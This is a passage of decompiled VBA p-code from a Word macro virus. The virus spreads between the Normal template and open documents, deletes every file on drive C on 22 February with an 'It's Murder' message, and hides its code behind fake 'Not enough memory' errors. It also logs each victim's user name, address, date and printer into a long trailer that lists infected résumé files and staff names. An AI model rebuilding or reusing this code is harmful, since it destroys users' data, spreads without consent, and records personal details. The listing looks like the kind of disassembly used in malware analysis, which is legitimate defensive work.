' 	QuoteRem 0x0000 0x003A " OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:"
' Line #71:
' 	Label Delivery 
' Line #72:
' 	QuoteRem 0x0000 0x003A " OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:"
' Line #73:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0016 
' 	Eq 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0002 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #74:
' 	QuoteRem 0x0000 0x003A " OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:"
' Line #75:
' 	LitStr 0x0006 "C:\*.*"
' 	ArgsCall Kill 0x0001 
' 	BoS 0x0000 
' Line #76:
' 	QuoteRem 0x0000 0x003A " OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:"
' Line #77:
' 	LitStr 0x000C "That's Right"
' 	Ld vbOK 
' 	Ld vbCritical 
' 	Add 
' 	LitStr 0x000B "It's Murder"
' 	ArgsLd MsgBox 0x0003 
' 	St rep 
' Line #78:
' 	QuoteRem 0x0000 0x003A " OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:"
' Line #79:
' 	GoTo Delivery 
' Line #80:
' 	QuoteRem 0x0000 0x003A " OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:"
' Line #81:
' 	EndIfBlock 
' Line #82:
' 	QuoteRem 0x0000 0x003A " OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:"
' Line #83:
' 	Ld DocumentInfected 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld NormalTemplateInfected 
' 	LitVarSpecial (True)
' 	Eq 
' 	Xor 
' 	Paren 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatDocument 
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatTemplate 
' 	Eq 
' 	Or 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #84:
' 	QuoteRem 0x0000 0x003A " OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:"
' Line #85:
' 	Ld DocumentInfected 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #86:
' 	QuoteRem 0x0000 0x003A " OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:"
' Line #87:
' 	Ld NormalTemplate 
' 	MemLd Saved 
' 	St SaveNormalTemplate 
' Line #88:
' 	QuoteRem 0x0000 0x003A " OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:"
' Line #89:
' 	LitDI2 0x0001 
' 	Ld ad 
' 	MemLd codemodule 
' 	MemLd countoflines 
' 	Ld ad 
' 	MemLd codemodule 
' 	ArgsMemLd Lines 0x0002 
' 	St virusCode 
' Line #90:
' 	QuoteRem 0x0000 0x003A " OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:"
' Line #91:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Application 
' 	MemLd UserAddress 
' 	FnLen 
' 	For 
' Line #92:
' 	QuoteRem 0x0000 0x003A " OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:"
' Line #93:
' 	Ld Application 
' 	MemLd UserAddress 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Ne 
' 	IfBlock 
' Line #94:
' 	QuoteRem 0x0000 0x003A " OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:"
' Line #95:
' 	Ld Application 
' 	MemLd UserAddress 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Ne 
' 	IfBlock 
' Line #96:
' 	QuoteRem 0x0000 0x003A " OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:"
' Line #97:
' 	Ld UserAddress 
' 	Ld Application 
' 	MemLd UserAddress 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Concat 
' 	St UserAddress 
' Line #98:
' 	QuoteRem 0x0000 0x003A " OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:"
' Line #99:
' 	EndIfBlock 
' Line #100:
' 	QuoteRem 0x0000 0x003A " OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:"
' Line #101:
' 	ElseBlock 
' Line #102:
' 	QuoteRem 0x0000 0x003A " OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:"
' Line #103:
' 	Ld UserAddress 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	St UserAddress 
' Line #104:
' 	QuoteRem 0x0000 0x003A " OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:"
' Line #105:
' 	EndIfBlock 
' Line #106:
' 	QuoteRem 0x0000 0x003A " OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:"
' Line #107:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #108:
' 	QuoteRem 0x0000 0x003A " OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:"
' Line #109:
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	Ld Time 
' 	LitStr 0x000F "hh:mm:ss AMPM -"
' 	ArgsLd Format$ 0x0002 
' 	Concat 
' 	Ld Date 
' 	LitStr 0x000F "dddd,d mmm,yyyy"
' 	ArgsLd Format$ 0x0002 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	Ld UserAddress 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	Ld Application 
' 	MemLd ActiveDocument 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St LogData 
' Line #110:
' 	QuoteRem 0x0000 0x003A " OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:"
' Line #111:
' 	Ld virusCode 
' 	Ld LogData 
' 	Concat 
' 	St virusCode 
' Line #112:
' 	QuoteRem 0x0000 0x003A " OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:"
' Line #113:
' 	LitDI2 0x0001 
' 	Ld nt 
' 	MemLd codemodule 
' 	MemLd countoflines 
' 	Ld nt 
' 	MemLd codemodule 
' 	ArgsMemCall Deletelines 0x0002 
' Line #114:
' 	QuoteRem 0x0000 0x003A " OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:"
' Line #115:
' 	Ld virusCode 
' 	Ld nt 
' 	MemLd codemodule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #116:
' 	QuoteRem 0x0000 0x003A " OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:"
' Line #117:
' 	StartWithExpr 
' 	Ld nt 
' 	MemLd codemodule 
' 	With 
' Line #118:
' 	QuoteRem 0x0000 0x003A " OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:"
' Line #119:
' 	LitDI2 0x00AE 
' 	LitStr 0x0010 "Sub viewVBcode()"
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0009 "x=Msgbox("
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x001B " Error - Not enough memory!"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0026 ", VbOkonly + VbApplication+Vbcritical,"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0013 "Visual Basic Editor"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0001 ")"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0007 "End Sub"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0010 "Sub ToolsMacro()"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0009 "x=Msgbox("
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x001B " Error - Not enough memory!"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0026 ", VbOkonly + VbApplication+Vbcritical,"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0013 "Visual Basic Editor"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0001 ")"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0007 "End Sub"
' 	Concat 
' 	ArgsMemCallWith replaceline 0x0002 
' Line #120:
' 	QuoteRem 0x0000 0x003A " OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:"
' Line #121:
' 	EndWith 
' Line #122:
' 	QuoteRem 0x0000 0x003A " OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:"
' Line #123:
' 	StartWithExpr 
' 	Ld nt 
' 	MemLd codemodule 
' 	With 
' Line #124:
' 	QuoteRem 0x0000 0x003A " OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:"
' Line #125:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x002D 
' 	LitDI2 0x00B5 
' 	LitDI2 0x0002 
' 	ForStep 
' Line #126:
' 	QuoteRem 0x0000 0x003A " OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:"
' Line #127:
' 	Ld x 
' 	LitStr 0x0002 "' "
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	LitStr 0x0001 " "
' 	Concat 
' 	Ld Application 
' 	MemLd ActiveDocument 
' 	Concat 
' 	Ld Now 
' 	Concat 
' 	Ld Application 
' 	MemLd ActivePrinter 
' 	Concat 
' 	ArgsMemCallWith replaceline 0x0002 
' Line #128:
' 	QuoteRem 0x0000 0x003A " OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:"
' Line #129:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #130:
' 	QuoteRem 0x0000 0x003A " OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:"
' Line #131:
' 	EndWith 
' Line #132:
' 	QuoteRem 0x0000 0x003A " OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:"
' Line #133:
' 	Ld SaveNormalTemplate 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #134:
' 	QuoteRem 0x0000 0x003A " OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:"
' Line #135:
' 	EndIfBlock 
' Line #136:
' 	QuoteRem 0x0000 0x003A " OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:"
' Line #137:
' 	Ld NormalTemplateInfected 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #138:
' 	QuoteRem 0x0000 0x003A " OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:"
' Line #139:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	St SaveDocument 
' Line #140:
' 	QuoteRem 0x0000 0x003A " OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:"
' Line #141:
' 	LitDI2 0x0001 
' 	Ld nt 
' 	MemLd codemodule 
' 	MemLd countoflines 
' 	Ld nt 
' 	MemLd codemodule 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	Ld Application 
' 	MemLd ActiveDocument 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St virusCode 
' Line #142:
' 	QuoteRem 0x0000 0x003A " OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:"
' Line #143:
' 	LitDI2 0x0001 
' 	Ld ad 
' 	MemLd codemodule 
' 	MemLd countoflines 
' 	Ld ad 
' 	MemLd codemodule 
' 	ArgsMemCall Deletelines 0x0002 
' Line #144:
' 	QuoteRem 0x0000 0x003A " OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:"
' Line #145:
' 	Ld virusCode 
' 	Ld ad 
' 	MemLd codemodule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #146:
' 	QuoteRem 0x0000 0x003A " OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:"
' Line #147:
' 	LitDI2 0x0001 
' 	Ld nt 
' 	MemLd codemodule 
' 	MemLd countoflines 
' 	Ld nt 
' 	MemLd codemodule 
' 	ArgsMemCall Deletelines 0x0002 
' Line #148:
' 	QuoteRem 0x0000 0x003A " OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:"
' Line #149:
' 	Ld virusCode 
' 	Ld nt 
' 	MemLd codemodule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #150:
' 	QuoteRem 0x0000 0x003A " OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:"
' Line #151:
' 	LitDI2 0x00AE 
' 	LitDI2 0x000D 
' 	Ld ad 
' 	MemLd codemodule 
' 	ArgsMemCall Deletelines 0x0002 
' Line #152:
' 	QuoteRem 0x0000 0x003A " OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:"
' Line #153:
' 	StartWithExpr 
' 	Ld ad 
' 	MemLd codemodule 
' 	With 
' Line #154:
' 	QuoteRem 0x0000 0x003A " OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:"
' Line #155:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x002D 
' 	LitDI2 0x00B5 
' 	LitDI2 0x0002 
' 	ForStep 
' Line #156:
' 	QuoteRem 0x0000 0x003A " OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:"
' Line #157:
' 	Ld x 
' 	LitStr 0x0002 "' "
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	LitStr 0x0001 " "
' 	Concat 
' 	Ld Application 
' 	MemLd ActiveDocument 
' 	Concat 
' 	Ld Now 
' 	Concat 
' 	Ld Application 
' 	MemLd ActivePrinter 
' 	Concat 
' 	ArgsMemCallWith replaceline 0x0002 
' Line #158:
' 	QuoteRem 0x0000 0x003A " OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:"
' Line #159:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #160:
' 	QuoteRem 0x0000 0x003A " OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:"
' Line #161:
' 	EndWith 
' Line #162:
' 	QuoteRem 0x0000 0x003A " OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:"
' Line #163:
' 	Ld SaveDocument 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #164:
' 	QuoteRem 0x0000 0x003A " OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:"
' Line #165:
' 	EndIfBlock 
' Line #166:
' 	QuoteRem 0x0000 0x003A " OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:"
' Line #167:
' 	EndIfBlock 
' Line #168:
' 	QuoteRem 0x0000 0x003A " OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:"
' Line #169:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #170:
' 	QuoteRem 0x0000 0x003A " OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:"
' Line #171:
' 	EndSub 
' Line #172:
' 	QuoteRem 0x0000 0x003A " OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:"
' Line #173:
' 	QuoteRem 0x0000 0x004B " Wuxb 俻倀俙俢楢棈彂0213.doc00/02/13 16:58:51EPSON VP-1100 - \\TONTRU\EPSON"
' Line #174:
' 	QuoteRem 0x0000 0x003A " OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:"
' Line #175:
' 	QuoteRem 0x0000 0x004B " Wuxb 俻倀俙俢楢棈彂0213.doc00/02/13 16:58:51EPSON VP-1100 - \\TONTRU\EPSON"
' Line #176:
' 	QuoteRem 0x0000 0x003A " OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:"
' Line #177:
' 	QuoteRem 0x0000 0x004B " Wuxb 俻倀俙俢楢棈彂0213.doc00/02/13 16:58:51EPSON VP-1100 - \\TONTRU\EPSON"
' Line #178:
' 	QuoteRem 0x0000 0x003A " OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:"
' Line #179:
' Line #180:
' 	QuoteRem 0x0000 0x003A " OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:"
' Line #181:
' Line #182:
' 	QuoteRem 0x0000 0x000D " Hotlist1.doc"
' Line #183:
' Line #184:
' 	QuoteRem 0x0000 0x0016 " Roy Zornow resume.doc"
' Line #185:
' Line #186:
' 	QuoteRem 0x0000 0x0014 " TK Move Manager.doc"
' Line #187:
' Line #188:
' 	QuoteRem 0x0000 0x0018 " AU Business Manager.doc"
' Line #189:
' Line #190:
' 	QuoteRem 0x0000 0x000B " GDLUCK.DOC"
' Line #191:
' Line #192:
' 	QuoteRem 0x0000 0x000B " NOMURA.doc"
' Line #193:
' Line #194:
' 	QuoteRem 0x0000 0x001A " Operations Generalist.doc"
' Line #195:
' Line #196:
' 	QuoteRem 0x0000 0x001C " PBX Telecom Coordinator.doc"
' Line #197:
' Line #198:
' 	QuoteRem 0x0000 0x000B " resume.doc"
' Line #199:
' Line #200:
' 	QuoteRem 0x0000 0x0011 " parm_meegada.doc"
' Line #201:
' Line #202:
' 	QuoteRem 0x0000 0x000B " Pramit.doc"
' Line #203:
' Line #204:
' 	QuoteRem 0x0000 0x000D " HOTLIST1.doc"
' Line #205:
' Line #206:
' 	QuoteRem 0x0000 0x0015 " Toshinobu SHIIKI.doc"
' Line #207:
' Line #208:
' 	QuoteRem 0x0000 0x0011 " Jacob Jacobs.doc"
' Line #209:
' Line #210:
' 	QuoteRem 0x0000 0x000D " cv_focus.doc"
' Line #211:
' Line #212:
' 	QuoteRem 0x0000 0x000C " letter2.doc"
' Line #213:
' Line #214:
' 	QuoteRem 0x0000 0x0018 " Hot List 05-27-1999.doc"
' Line #215:
' Line #216:
' 	QuoteRem 0x0000 0x000B " Ashwat.doc"
' Line #217:
' Line #218:
' 	QuoteRem 0x0000 0x000C " dbaunix.doc"
' Line #219:
' Line #220:
' 	QuoteRem 0x0000 0x0009 " juno.doc"
' Line #221:
' Line #222:
' 	QuoteRem 0x0000 0x000A " CVMBA.doc"
' Line #223:
' Line #224:
' 	QuoteRem 0x0000 0x000E " RESUME399.doc"
' Line #225:
' Line #226:
' 	QuoteRem 0x0000 0x000D " Alex Lam.doc"
' Line #227:
' Line #228:
' 	QuoteRem 0x0000 0x001E " Senior Unix Administrator.doc"
' Line #229:
' Line #230:
' 	QuoteRem 0x0000 0x001E " Senior Unix Administrator.doc"
' Line #231:
' Line #232:
' 	QuoteRem 0x0000 0x0014 " RESUME LATEST11.doc"
' Line #233:
' Line #234:
' 	QuoteRem 0x0000 0x0013 " Ryuji Iwamoto1.doc"
' Line #235:
' Line #236:
' 	QuoteRem 0x0000 0x000A " Document1"
' Line #237:
' Line #238:
' 	QuoteRem 0x0000 0x0015 " Sivaram Venkata1.doc"
' Line #239:
' Line #240:
' 	QuoteRem 0x0000 0x001A " Dean's Resume Current.doc"
' Line #241:
' Line #242:
' 	QuoteRem 0x0000 0x000C " infrmgr.doc"
' Line #243:
' Line #244:
' 	QuoteRem 0x0000 0x000D " Alan LEE.doc"
' Line #245:
' Line #246:
' 	QuoteRem 0x0000 0x0010 " Jackson YAU.doc"
' Line #247:
' Line #248:
' 	QuoteRem 0x0000 0x0010 " Patrickshum.doc"
' Line #249:
' Line #250:
' 	QuoteRem 0x0000 0x000B " Resume.doc"
' Line #251:
' Line #252:
' 	QuoteRem 0x0000 0x0010 " CurrVit (1).doc"
' Line #253:
' Line #254:
' 	QuoteRem 0x0000 0x000C " SaleTar.doc"
' Line #255:
' Line #256:
' 	QuoteRem 0x0000 0x0015 " Gerald Sanderson.doc"
' Line #257:
' Line #258:
' 	QuoteRem 0x0000 0x000A " Lee-A.doc"
' Line #259:
' Line #260:
' 	QuoteRem 0x0000 0x000D " carmel~1.doc"
' Line #261:
' Line #262:
' 	QuoteRem 0x0000 0x001A " 990116.res-detail-ltt.doc"
' Line #263:
' Line #264:
' 	QuoteRem 0x0000 0x000B " resume.doc"
' Line #265:
' Line #266:
' 	QuoteRem 0x0000 0x0011 " Ad tech supp.doc"
' Line #267:
' Line #268:
' 	QuoteRem 0x0000 0x001F " Interview Discussion Items.doc"
' Line #269:
' Line #270:
' 	QuoteRem 0x0000 0x000C " Rres97j.doc"
' Line #271:
' Line #272:
' 	QuoteRem 0x0000 0x000C " Cvrltra.doc"
' Line #273:
' Line #274:
' 	QuoteRem 0x0000 0x000D " HOTLIST1.doc"
' Line #275:
' Line #276:
' 	QuoteRem 0x0000 0x000A " Mar-W.doc"
' Line #277:
' Line #278:
' 	QuoteRem 0x0000 0x000F " thomas chu.doc"
' Line #279:
' Line #280:
' 	QuoteRem 0x0000 0x0020 " 09:17:55 AM -Monday,21 Jun,1999"
' Line #281:
' 	QuoteRem 0x0000 0x0006 " hunga"
' Line #282:
' 	QuoteRem 0x0000 0x0000 ""
' Line #283:
' 	QuoteRem 0x0000 0x000F " Thomas Chu.doc"
' Line #284:
' Line #285:
' 	QuoteRem 0x0000 0x0027 " PC Asset Change Form Proliant 5000.doc"
' Line #286:
' Line #287:
' 	QuoteRem 0x0000 0x0012 " fax.template2.doc"
' Line #288:
' Line #289:
' 	QuoteRem 0x0000 0x0015 " EAS Fax 19990622.doc"
' Line #290:
' Line #291:
' 	QuoteRem 0x0000 0x000D " ~0040067.doc"
' Line #292:
' Line #293:
' 	QuoteRem 0x0000 0x000D " ~0002553.doc"
' Line #294:
' Line #295:
' 	QuoteRem 0x0000 0x0014 " 19990609summary.doc"
' Line #296:
' Line #297:
' 	QuoteRem 0x0000 0x0020 " 04:05:14 PM -Friday,16 Jul,1999"
' Line #298:
' 	QuoteRem 0x0000 0x0008 " chanjim"
' Line #299:
' 	QuoteRem 0x0000 0x0000 ""
' Line #300:
' 	QuoteRem 0x0000 0x0014 " 19990702summary.doc"
' Line #301:
' Line #302:
' 	QuoteRem 0x0000 0x0009 " Doc1.doc"
' Line #303:
' Line #304:
' 	QuoteRem 0x0000 0x000A " Document1"
' Line #305:
' Line #306:
' 	QuoteRem 0x0000 0x000A " Document1"
' Line #307:
' Line #308:
' 	QuoteRem 0x0000 0x000D " offsite1.doc"
' Line #309:
' Line #310:
' 	QuoteRem 0x0000 0x000D " offsite2.doc"
' Line #311:
' Line #312:
' 	QuoteRem 0x0000 0x0021 " Cover Letter for your Resume.doc"
' Line #313:
' Line #314:
' 	QuoteRem 0x0000 0x000D " ~0058164.doc"
' Line #315:
' Line #316:
' 	QuoteRem 0x0000 0x000A " Document1"
' Line #317:
' Line #318:
' 	QuoteRem 0x0000 0x0009 " Doc1.doc"
' Line #319:
' Line #320:
' 	QuoteRem 0x0000 0x000A " Document2"
' Line #321:
' Line #322:
' 	QuoteRem 0x0000 0x000A " Document3"
' Line #323:
' Line #324:
' 	QuoteRem 0x0000 0x0008 " Fax.doc"
' Line #325:
' Line #326:
' 	QuoteRem 0x0000 0x0020 " 03:31:57 PM -Friday,23 Jul,1999"
' Line #327:
' 	QuoteRem 0x0000 0x0005 " leed"
' Line #328:
' 	QuoteRem 0x0000 0x0000 ""
' Line #329:
' 	QuoteRem 0x0000 0x0008 " Fax.doc"
' Line #330:
' Line #331:
' 	QuoteRem 0x0000 0x000D " RES0699b.doc"
' Line #332:
' Line #333:
' 	QuoteRem 0x0000 0x000A " Document1"
' Line #334:
' Line #335:
' 	QuoteRem 0x0000 0x0008 " KTB.doc"
' Line #336:
' Line #337:
' 	QuoteRem 0x0000 0x0008 " KTB.doc"
' Line #338:
' Line #339:
' 	QuoteRem 0x0000 0x000D " Ww260799.doc"
' Line #340:
' Line #341:
' 	QuoteRem 0x0000 0x000D " Ww260799.doc"
' Line #342:
' Line #343:
' 	QuoteRem 0x0000 0x000E " wwh260799.doc"
' Line #344:
' Line #345:
' 	QuoteRem 0x0000 0x000E " wwh260799.doc"
' Line #346:
' Line #347:
' 	QuoteRem 0x0000 0x000E " wwh260799.doc"
' Line #348:
' Line #349:
' 	QuoteRem 0x0000 0x000A " Document1"
' Line #350:
' Line #351:
' 	QuoteRem 0x0000 0x000A " Document1"
' Line #352:
' Line #353:
' 	QuoteRem 0x0000 0x000D " offsite1.doc"
' Line #354:
' Line #355:
' 	QuoteRem 0x0000 0x000C " th0727a.doc"
' Line #356:
' Line #357:
' 	QuoteRem 0x0000 0x000F " corp-chart.doc"
' Line #358:
' Line #359:
' 	QuoteRem 0x0000 0x000D " RES0699b.doc"
' Line #360:
' Line #361:
' 	QuoteRem 0x0000 0x000D " BIRTHDAY.DOC"
' Line #362:
' Line #363:
' 	QuoteRem 0x0000 0x000F " th0729adoc.doc"
' Line #364:
' Line #365:
' 	QuoteRem 0x0000 0x000F " th0729adoc.doc"
' Line #366:
' Line #367:
' 	QuoteRem 0x0000 0x0022 " 03:13:09 PM -Thursday,29 Jul,1999"
' Line #368:
' 	QuoteRem 0x0000 0x0009 " andrewti"
' Line #369:
' 	QuoteRem 0x0000 0x0000 ""
' Line #370:
' 	QuoteRem 0x0000 0x000D " ~0061018.doc"
' Line #371:
' Line #372:
' 	QuoteRem 0x0000 0x0013 " Exit Strategy .doc"
' Line #373:
' Line #374:
' 	QuoteRem 0x0000 0x000A " Document1"
' Line #375:
' Line #376:
' 	QuoteRem 0x0000 0x001B " Morning meeting roster.doc"
' Line #377:
' Line #378:
' 	QuoteRem 0x0000 0x000C " Meralco.doc"
' Line #379:
' Line #380:
' 	QuoteRem 0x0000 0x0010 " GAS_Bst0799.doc"
' Line #381:
' Line #382:
' 	QuoteRem 0x0000 0x001A " Response to Mark Ogle.doc"
' Line #383:
' Line #384:
' 	QuoteRem 0x0000 0x000B " Doc11_.doc"
' Line #385:
' Line #386:
' 	QuoteRem 0x0000 0x000D " ~0025144.doc"
' Line #387:
' Line #388:
' 	QuoteRem 0x0000 0x000D " bt9flyer.doc"
' Line #389:
' Line #390:
' 	QuoteRem 0x0000 0x002C " A crocodile cannot stick its tongue out.doc"
' Line #391:
' Line #392:
' 	QuoteRem 0x0000 0x000A " Document1"
' Line #393:
' Line #394:
' 	QuoteRem 0x0000 0x000C " gas0899.doc"
' Line #395:
' Line #396:
' 	QuoteRem 0x0000 0x000D " smtm.....doc"
' Line #397:
' Line #398:
' 	QuoteRem 0x0000 0x000B " foster.doc"
' Line #399:
' Line #400:
' 	QuoteRem 0x0000 0x0021 " Final meeting follow up memo.doc"
' Line #401:
' Line #402:
' 	QuoteRem 0x0000 0x000A " Document3"
' Line #403:
' Line #404:
' 	QuoteRem 0x0000 0x000E " frontpage.doc"
' Line #405:
' Line #406:
' 	QuoteRem 0x0000 0x0020 " 09:52:49 AM -Tuesday,3 Aug,1999"
' Line #407:
' 	QuoteRem 0x0000 0x0005 " manc"
' Line #408:
